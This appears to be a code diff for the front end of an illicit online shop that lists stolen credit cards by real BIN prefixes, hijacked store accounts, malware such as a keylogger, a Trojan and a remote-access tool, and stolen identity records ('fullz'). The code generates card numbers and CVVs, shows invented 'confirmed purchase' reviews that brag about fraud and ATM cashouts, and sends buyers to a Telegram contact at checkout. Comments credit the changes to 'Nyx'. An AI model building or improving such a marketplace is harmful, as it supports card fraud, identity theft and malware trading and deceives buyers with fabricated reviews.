+      'took a min but got my order, worth it tho 🔥',
+      'paypal went smooth, no issues, ima cop again',
+      'dis fullz got me a loan, too easy bruh 💯',
+      'malware hit quick, snagged bank logins no prob',
+      'card was fire but foenem slow to respond 😭',
+      'visa bins hittin’ different, copped a fit 🔥',
+      'saks account was clutch, bagged some gucci 💼',
+      'mastercard went crazy at online stores, no flags 🚀',
+      'fullz worked for a quick loan, clean asf 💰',
+      'keylogger got me bank creds in a day, too easy 😎',
+      'amex card hit for luxury, no cap, pure profit 💳',
+      'walmart card copped electronics, no hassle 📺',
+      'trojan x was plug-n-play, stole data quick 🖥️',
+      'nordstrom gift card got me fresh, 10/10 🙌',
+      'chase card cashed out ATMs, dummy clean 💸',
+      'fullz got me a credit line, no issues 💪',
+      'malware setup was simple, snagged logins fast ⚡',
+      'visa hit saks for a bag, worth every penny 🛍️',
+      'macys account was fire, copped home goods 🛋️',
+      'discover card slid through online, no blocks 📦',
+      'rat z took over a device in hours, elite shit 🖱️',
+      'saks drop had high balance, ran it up quick 💯',
+      'mastercard bins no declines, pure bands 🏦',
+      'fullz was verified, opened accounts easy 📋',
+      'keylogger was stealth, got passwords no prob 🔒'
+    ];
+    // Nyx: Updated BIN ranges for randomization
+    const cardData = [
+      { type: 'Visa', binPrefix: ['4532', '4716', '4929', '4485'], logo: 'https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg', use: 'Shop online or cash out at ATMs. Clean bins, high limits.', video: 'https://example.com/visa-demo.mp4', reviews: []},
+      { type: 'MasterCard', binPrefix: ['5112', '5313', '5455', '5555'], logo: 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg', use: 'Perfect for subscriptions or big purchases. Easy cashout.', video: 'https://example.com/mastercard-demo.mp4', reviews: []},
+      { type: 'Discover', binPrefix: ['6011', '6440', '6500', '6599'], logo: 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg', use: 'Great for online stores. Low suspicion, high success.', video: 'https://example.com/discover-demo.mp4', reviews: []},
+      { type: 'Amex', binPrefix: ['3411', '3712', '3782', '3799'], logo: 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg', use: 'Luxury purchases or high-value cashouts. Elite bins.', video: 'https://example.com/amex-demo.mp4', reviews: []},
+      { type: 'Chase', binPrefix: ['4266', '4217', '4281', '4298'], logo: 'https://upload.wikimedia.org/wikipedia/commons/2/2e/Chase_Bank_logo.svg', use: 'Premium bank card for cashouts. High success rate.', video: 'https://example.com/chase-demo.mp4', soldOut: true, reviews: []}
+    ];
+    const accountData = [
+      { type: 'Saks Account', binPrefix: ['9000', '9001', '9002', '9003'], logo: 'https://upload.wikimedia.org/wikipedia/commons/3/3f/Saks_Fifth_Avenue_logo.svg', use: 'Buy luxury goods at Saks. Up to $2,000 balance.', video: 'https://example.com/saks-demo.mp4', reviews: []},
+      { type: 'Nordstrom Gift Card', binPrefix: ['9100', '9101', '9102', '9103'], logo: 'https://upload.wikimedia.org/wikipedia/commons/0/06/Nordstrom_Logo.svg', use: 'Shop fashion at Nordstrom. Redeem online or in-store.', video: 'https://example.com/nordstrom-demo.mp4', reviews: []},
+      { type: 'Walmart Gift Card', binPrefix: ['9200', '9201', '9202', '9203'], logo: 'https://upload.wikimedia.org/wikipedia/commons/c/ca/Walmart_logo.svg', use: 'Purchase electronics or groceries at Walmart. Easy to use.', video: 'https://example.com/walmart-demo.mp4', reviews: []},
+      { type: 'Macy’s Account', binPrefix: ['9300', '9301', '9302', '9303'], logo: 'https://upload.wikimedia.org/wikipedia/commons/5/5b/Macy%27s_Logo.svg', use: 'Shop at Macy’s for clothes and home goods. High balance.', video: 'https://example.com/macys-demo.mp4', soldOut: true, reviews: []}
+    ];
+    const malwareData = [
+      { type: 'Stealth Keylogger', binPrefix: ['9400', '9401', '9402', '9403'], logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Black_skull.svg', use: 'Capture passwords and bank logins silently. Easy setup.', video: 'https://example.com/keylogger-demo.mp4', reviews: []},
+      { type: 'Trojan X', binPrefix: ['9500', '9501', '9502', '9503'], logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Black_skull.svg', use: 'Remote access and data theft. Plug-and-play.', video: 'https://example.com/trojan-demo.mp4', soldOut: true, reviews: []},
+      { type: 'RAT Z', binPrefix: ['9600', '9601', '9602', '9603'], logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Black_skull.svg', use: 'Steal files and control devices remotely. High success.', video: 'https://example.com/ratz-demo.mp4', reviews: []}
+    ];
+    const fullzData = [
+      { type: 'Fullz - John Doe', binPrefix: ['9700', '9701', '9702', '9703'], logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Black_skull.svg', use: 'Open bank accounts or apply for loans. Clean data.', video: 'https://example.com/fullz1-demo.mp4', reviews: []},
+      { type: 'Fullz - Jane Smith', binPrefix: ['9800', '9801', '9802', '9803'], logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Black_skull.svg', use: 'Use for credit applications or online purchases. High success.', video: 'https://example.com/fullz2-demo.mp4', reviews: []},
+      { type: 'Fullz - Mike Brown', binPrefix: ['9900', '9901', '9902', '9903'], logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Black_skull.svg', use: 'Perfect for high-value applications. Verified data.', video: 'https://example.com/fullz3-demo.mp4', soldOut: true, reviews: []}
+    ];
+
+    function getUniqueRandomComments(count, usedComments) {
+      const availableComments = commentPool.filter(comment => !usedComments.includes(comment));
+      if (availableComments.length < count) {
+        console.warn('Not enough unique comments available');
+        return availableComments.sort(() => 0.5 - Math.random()).slice(0, count);
+      }
+      return availableComments.sort(() => 0.5 - Math.random()).slice(0, count);
+    }
+
+    function getUniqueRandomUsernames(count, usedUsernames) {
+      const availableUsernames = usernames.filter(username => !usedUsernames.includes(username));
+      if (availableUsernames.length < count) {
+        console.warn('Not enough unique usernames available');
+        return availableUsernames.sort(() => 0.5 - Math.random()).slice(0, count);
+      }
+      return availableUsernames.sort(() => 0.5 - Math.random()).slice(0, count);
+    }
+
+    function populateReviews() {
+      const allItems = [...cardData, ...accountData, ...malwareData, ...fullzData];
+      const usedComments = [];
+      const usedUsernames = [];
+      allItems.forEach(item => {
+        const reviewCount = Math.floor(Math.random() * 2) + 2;
+        const selectedComments = getUniqueRandomComments(reviewCount, usedComments);
+        const selectedUsernames = getUniqueRandomUsernames(reviewCount, usedUsernames);
+        item.reviews = selectedComments.map((comment, index) => ({
+          rating: Math.random() * 2 + 3,
+          comment,
+          username: selectedUsernames[index] || usernames[Math.floor(Math.random() * usernames.length)]
+        }));
+        usedComments.push(...selectedComments);
+        usedUsernames.push(...selectedUsernames);
       });
     }
+
+    populateReviews();
+
+    function toggleMenu() {
+      const sidebar = document.getElementById('sidebar');
+      sidebar.classList.toggle('active');
+    }
+
+    function showAccountSection() {
+      document.getElementById('account-section').style.display = 'block';
+      document.getElementById('cart-section').style.display = 'none';
+      document.querySelectorAll('.section').forEach(section => section.style.display = 'none');
+      document.getElementById('loading-screen').style.display = 'none';
+    }
+
+    function showCart() {
+      document.getElementById('cart-section').style.display = 'block';
+      document.getElementById('account-section').style.display = 'none';
+      document.querySelectorAll('.section').forEach(section => section.style.display = 'none');
+      displayCart();
+    }
+
+    function createAccount() {
+      const username = document.getElementById('username-input').value.trim();
+      const password = document.getElementById('password-input').value.trim();
+      if (username && password) {
+        if (!username.match(/^[a-zA-Z0-9_]+$/)) {
+          alert('Username can only contain letters, numbers, and underscores.');
+          return;
+        }
+        const users = JSON.parse(localStorage.getItem('users') || '{}');
+        if (users[username]) {
+          alert('Username already taken, fam.');
+          return;
+        }
+        users[username] = { password, purchased: false, cart: [] };
+        localStorage.setItem('users', JSON.stringify(users));
+        localStorage.setItem('currentUser', username);
+        document.getElementById('user-info').textContent = `Logged in as ${username}`;
+        document.getElementById('account-section').style.display = 'none';
+        loadPage('cards');
+      } else {
+        alert('Enter a username and password, fam.');
+      }
+    }
+
+    function login() {
+      const username = document.getElementById('username-input').value.trim();
+      const password = document.getElementById('password-input').value.trim();
+      const users = JSON.parse(localStorage.getItem('users') || '{}');
+      if (users[username] && users[username].password === password) {
+        localStorage.setItem('currentUser', username);
+        document.getElementById('user-info').textContent = `Logged in as ${username}`;
+        document.getElementById('account-section').style.display = 'none';
+        loadPage('cards');
+      } else {
+        alert('Wrong username or password, fam.');
+      }
+    }
+
+    function logout() {
+      localStorage.removeItem('currentUser');
+      document.getElementById('user-info').textContent = '';
+      showAccountSection();
+    }
+
+    // Nyx: Fixed addToCart to handle unique item IDs and ensure cart persistence
+    function addToCart(item) {
+      const username = localStorage.getItem('currentUser');
+      if (!username) {
+        alert('Log in to add to cart, fam.');
+        showAccountSection();
+        return;
+      }
+      const users = JSON.parse(localStorage.getItem('users') || '{}');
+      if (!users[username]) {
+        users[username] = { password: '', purchased: false, cart: [] };
+      }
+      // Nyx: Add unique ID to item to prevent duplicates
+      item.id = `${item.cardType}-${item.cardNumber}-${Date.now()}`;
+      users[username].cart = users[username].cart || [];
+      users[username].cart.push(item);
+      localStorage.setItem('users', JSON.stringify(users));
+      alert(`${item.cardType} added to cart!`);
+      displayCart(); // Nyx: Update cart display immediately
+    }
+
+    // Nyx: Fixed displayCart to ensure buttons work and cart updates
+    function displayCart() {
+      const username = localStorage.getItem('currentUser');
+      const cartItems = document.getElementById('cart-items');
+      cartItems.innerHTML = '';
+      if (!username) {
+        cartItems.innerHTML = '<p>Log in to view your cart, fam.</p>';
+        return;
+      }
+      const users = JSON.parse(localStorage.getItem('users') || '{}');
+      const cart = users[username]?.cart || [];
+      if (cart.length === 0) {
+        cartItems.innerHTML = '<p>Cart empty, fam. Stack some drops!</p>';
+        return;
+      }
+      cart.forEach((item, index) => {
+        const cartItem = document.createElement('div');
+        cartItem.className = 'cart-item';
+        cartItem.innerHTML = `
+          <p>${item.cardType} - $${item.price} (BIN: ${item.cardNumber.slice(0, 5)})</p>
+          <button onclick="removeFromCart('${item.id}')">Remove</button>
+        `;
+        cartItems.appendChild(cartItem);
+      });
+    }
+
+    // Nyx: Fixed removeFromCart to use item ID
+    function removeFromCart(itemId) {
+      const username = localStorage.getItem('currentUser');
+      if (!username) return;
+      const users = JSON.parse(localStorage.getItem('users') || '{}');
+      users[username].cart = users[username].cart.filter(item => item.id !== itemId);
+      localStorage.setItem('users', JSON.stringify(users));
+      displayCart();
+    }
+
+    // Nyx: Fixed checkout to ensure cart clears correctly
+    function checkout() {
+      const username = localStorage.getItem('currentUser');
+      if (!username) {
+        alert('Log in to checkout, fam.');
+        showAccountSection();
+        return;
+      }
+      const users = JSON.parse(localStorage.getItem('users') || '{}');
+      if (!users[username].cart || users[username].cart.length === 0) {
+        alert('Your cart is empty, fam.');
+        return;
+      }
+      users[username].purchased = true;
+      users[username].cart = [];
+      localStorage.setItem('users', JSON.stringify(users));
+      alert('Checkout complete! Redirecting to Telegram...');
+      window.location.href = 'https://t.me/rakrunnin';
+    }
+
+    function addComment(item, reviewsId) {
+      const commentInput = document.getElementById(`comment-input-${reviewsId}`);
+      const comment = commentInput.value.trim();
+      if (!comment) return;
+      const users = JSON.parse(localStorage.getItem('users') || '{}');
+      const username = localStorage.getItem('currentUser');
+      if (!username || !users[username].purchased) {
+        alert('Gotta make a confirmed purchase to comment, fam.');
+        return;
+      }
+      item.reviews.push({ rating: 0, comment, username });
+      commentInput.value = '';
+      displayItems('all', getContainerId(item.cardType), item.category);
+    }
+
+    // Nyx: Updated generateItem to randomize first 5 digits of BIN
+    function generateItem(category) {
+      const data = category === 'cards' ? cardData : category === 'accounts' ? accountData : category === 'malware' ? malwareData : fullzData;
+      const item = data[Math.floor(Math.random() * data.length)];
+      // Nyx: Randomly select a valid BIN prefix and append a random digit
+      const binPrefix = item.binPrefix[Math.floor(Math.random() * item.binPrefix.length)];
+      const randomDigit = Math.floor(Math.random() * 10);
+      const bin = binPrefix + randomDigit;
+      const cardNumber = bin + Array(10).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
+      const expiryMonth = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
+      const expiryYear = String(Math.floor(Math.random() * 10) + 24);
+      const cvv = category === 'cards' ? String(Math.floor(Math.random() * 1000)).padStart(3, '0') : '';
+      const price = Math.floor(Math.random() * 76 + 25);
+      const soldOut = item.soldOut || Math.random() < 0.2;
+      const usedComments = [];
+      const usedUsernames = [];
+      const reviewCount = Math.floor(Math.random() * 2) + 2;
+      const selectedComments = getUniqueRandomComments(reviewCount, usedComments);
+      const selectedUsernames = getUniqueRandomUsernames(reviewCount, usedUsernames);
+      const selectedReviews = selectedComments.map((comment, index) => ({
+        rating: Math.random() * 2 + 3,
+        comment,
+        username: selectedUsernames[index] || usernames[Math.floor(Math.random() * usernames.length)]
+      }));
+      usedComments.push(...selectedComments);
+      usedUsernames.push(...selectedUsernames);
+      return {
+        cardNumber: cardNumber.match(/.{1,4}/g)?.join('-') || cardNumber,
+        expiry: category === 'cards' ? `${expiryMonth}/${expiryYear}` : '',
+        cvv,
+        cardType: item.type,
+        logo: item.logo,
+        video: item.video,
+        price,
+        use: item.use,
+        soldOut,
+        reviews: selectedReviews,
+        category
+      };
+    }
+
+    function getContainerId(cardType) {
+      if (cardData.some(c => c.type === cardType)) return 'cardContainer';
+      if (accountData.some(c => c.type === cardType)) return 'accountContainer';
+      if (malwareData.some(c => c.type === cardType)) return 'malwareContainer';
+      return 'fullzContainer';
+    }
+
+    function displayItems(filter = 'all', containerId = 'cardContainer', category = 'cards') {
+      const container = document.getElementById(containerId);
+      container.innerHTML = '';
+      const items = Array(1000).fill().map(() => generateItem(category));
+      let filteredItems = items;
+      if (filter !== 'all') {
+        filteredItems = items.filter(item => item.cardType === filter);
+      }
+      filteredItems.slice(0, 50).forEach(item => addItem(item, container));
+      updateSidebar();
+    }
+
+    function addItem(item, container) {
+      const reviewsId = `reviews-${item.cardType}-${item.cardNumber.replace(/-/g, '')}`;
+      const itemDiv = document.createElement('div');
+      itemDiv.className = 'item';
+      const users = JSON.parse(localStorage.getItem('users') || '{}');
+      const currentUser = localStorage.getItem('currentUser');
+      const canComment = currentUser && users[currentUser]?.purchased;
+      itemDiv.innerHTML = `
+        ${item.soldOut ? '<p class="sold-out">SOLD OUT</p>' : `
+          <img src="${item.logo}" alt="${item.cardType}">
+          <video class="item-video" loop muted>
+            <source src="${item.video}" type="video/mp4">
+          </video>
+        `}
+        <h3>${item.cardType} - $${item.price}</h3>
+        <p>Price: $${item.price}</p>
+        <p>${item.category === 'cards' ? `Card Number: ${item.cardNumber.slice(0, 5)}XXXX-XXXX-XXXX` : `ID: ${item.cardNumber}`}</p>
+        ${item.expiry ? `<p>Expiry: ${item.expiry} | CVV: ***</p>` : ''}
+        <p>${item.use}</p>
+        <p class="stars">${'★'.repeat(Math.floor(item.reviews[0].rating))}${item.reviews[0].rating % 1 ? '☆' : ''} ${item.reviews[0].rating.toFixed(1)}/5</p>
+        <button class="reviews-btn" onclick="toggleReviews('${reviewsId}')">See Reviews</button>
+        <div class="reviews-container" id="${reviewsId}">
+          ${item.reviews.map(review => `
+            <p class="comment">
+              <span class="username">${review.username}</span>
+              <span class="confirmed-badge">Confirmed Purchase</span>: ${review.comment}
+            </p>
+          `).join('')}
+          <div class="comment-input-container">
+            <input type="text" class="comment-input" id="comment-input-${reviewsId}" placeholder="Drop a comment..." ${canComment ? '' : 'disabled'}>
+            ${!canComment ? '<span class="lock-icon">🔒</span>' : ''}
+          </div>
+          <button class="comment-btn" onclick="addComment(${JSON.stringify(item)}, '${reviewsId}')" ${canComment ? '' : 'disabled'}>Post Comment</button>
+        </div>
+        <button class="buy-btn" ${item.soldOut ? 'disabled' : ''} onclick="addToCart(${JSON.stringify(item)})">Add to Cart</button>
+      `;
+      container.appendChild(itemDiv);
+      if (!item.soldOut) {
+        const video = itemDiv.querySelector('.item-video');
+        itemDiv.addEventListener('mouseenter', () => {
+          video.style.display = 'block';
+          video.play();
+        });
+        itemDiv.addEventListener('mouseleave', () => {
+          video.style.display = 'none';
+          video.pause();
+        });
+      }
+    }
+
+    function toggleReviews(reviewsId) {
+      const reviewsContainer = document.getElementById(reviewsId);
+      reviewsContainer.classList.toggle('active');
+      reviewsContainer.style.display = reviewsContainer.classList.contains('active') ? 'block' : 'none';
+    }
+
+    function updateSidebar() {
+      const sidebarMenu = document.getElementById('sidebar-menu');
+      sidebarMenu.innerHTML = '';
+      const categories = [
+        { name: 'Credit Cards', id: 'cards', container: 'cardContainer' },
+        { name: 'Store Accounts', id: 'accounts', container: 'accountContainer' },
+        { name: 'Malware', id: 'malware', container: 'malwareContainer' },
+        { name: 'Fullz', id: 'fullz', container: 'fullzContainer' }
+      ];
+      categories.forEach(category => {
+        const types = (category.id === 'cards' ? cardData : category.id === 'accounts' ? accountData : category.id === 'malware' ? malwareData : fullzData)
+          .map(item => item.type);
+        types.forEach(type => {
+          const count = Array.from(document.getElementById(category.container).children)
+            .filter(item => item.querySelector('h3').textContent.includes(type) && !item.querySelector('.sold-out')).length;
+          const li = document.createElement('li');
+          li.textContent = `${type} (${count} available)`;
+          li.className = count === 0 ? 'sold-out' : '';
+          li.onclick = count > 0 ? () => filterItems(type, category.container, category.id) : null;
+          sidebarMenu.appendChild(li);
+        });
+      });
+      sidebarMenu.innerHTML += '<li onclick="showAccountSection()">Account</li>';
+      sidebarMenu.innerHTML += '<li onclick="showCart()">Cart</li>';
+    }
+
+    // Nyx: Updated searchItems to include BIN search
+    function searchItems(query) {
+      const containers = ['cardContainer', 'accountContainer', 'malwareContainer', 'fullzContainer'];
+      containers.forEach(containerId => {
+        const container = document.getElementById(containerId);
+        const items = container.getElementsByClassName('item');
+        Array.from(items).forEach(item => {
+          const title = item.querySelector('h3').textContent.toLowerCase();
+          const bin = item.querySelector('p:nth-child(4)').textContent.toLowerCase();
+          const isMatch = title.includes(query.toLowerCase()) || bin.includes(query.toLowerCase());
+          item.style.display = isMatch ? 'block' : 'none';
+        });
+      });
+      updateSidebar();
+    }
+
+    function filterItems(type, containerId, category) {
+      displayItems(type, containerId, category);
+    }
+
+    function sortItems(containerId) {
+      const container = document.getElementById(containerId);
+      const items = Array.from(container.children);
+      items.sort((a, b) => {
+        const priceA = parseInt(a.querySelector('p:nth-child(3)').textContent.split('$')[1]);
+        const priceB = parseInt(b.querySelector('p:nth-child(3)').textContent.split('$')[1]);
+        return priceA - priceB;
+      });
+      container.innerHTML = '';
+      items.forEach(item => container.appendChild(item));
+      updateSidebar();
+    }
+
+    function sortItemsByRating(containerId) {
+      const container = document.getElementById(containerId);
+      const items = Array.from(container.children);
+      items.sort((a, b) => {
+        const ratingA = parseFloat(a.querySelector('.stars').textContent.split('/')[0].slice(-3));
+        const ratingB = parseFloat(b.querySelector('.stars').textContent.split('/')[0].slice(-3));
+        return ratingB - ratingA;
+      });
+      container.innerHTML = '';
+      items.forEach(item => container.appendChild(item));
+      updateSidebar();
+    }
+
+    function toggleTheme() {
+      document.body.classList.toggle('dark-theme');
+      document.body.classList.toggle('neon-theme');
+    }
+
+    function loadPage(sectionId) {
+      document.getElementById('loading-screen').style.display = 'flex';
+      setTimeout(() => {
+        document.getElementById('cards-section').style.display = sectionId === 'cards' ? 'block' : 'none';
+        document.getElementById('accounts-section').style.display = sectionId === 'accounts' ? 'block' : 'none';
+        document.getElementById('malware-section').style.display = sectionId === 'malware' ? 'block' : 'none';
+        document.getElementById('fullz-section').style.display = sectionId === 'fullz' ? 'block' : 'none';
+        document.getElementById('account-section').style.display = 'none';
+        document.getElementById('cart-section').style.display = 'none';
+        if (sectionId === 'cards') displayItems('all', 'cardContainer', 'cards');
+        else if (sectionId === 'accounts') displayItems('all', 'accountContainer', 'accounts');
+        else if (sectionId === 'malware') displayItems('all', 'malwareContainer', 'malware');
+        else if (sectionId === 'fullz') displayItems('all', 'fullzContainer', 'fullz');
+        document.getElementById('loading-screen').style.display = 'none';
+      }, 1500);
+    }
+
+    function verifyCaptcha() {
+      const input = document.getElementById('captcha-input').value;
+      if (input === '13') {
+        document.getElementById('captcha-screen').style.display = 'none';
+        const username = localStorage.getItem('currentUser');
+        if (username) {
+          document.getElementById('user-info').textContent = `Logged in as ${username}`;
+          loadPage('cards');
+        } else {
+          showAccountSection();
+        }
+      } else {
+        alert('Wrong answer, fam. Try again.');
+      }
+    }
+
+    window.onload = () => {
+      displayItems('all', 'cardContainer', 'cards');
+      displayItems('all', 'accountContainer', 'accounts');
+      displayItems('all', 'malwareContainer', 'malware');
+      displayItems('all', 'fullzContainer', 'fullz');
+    };
   </script>
 </body>
 </html>
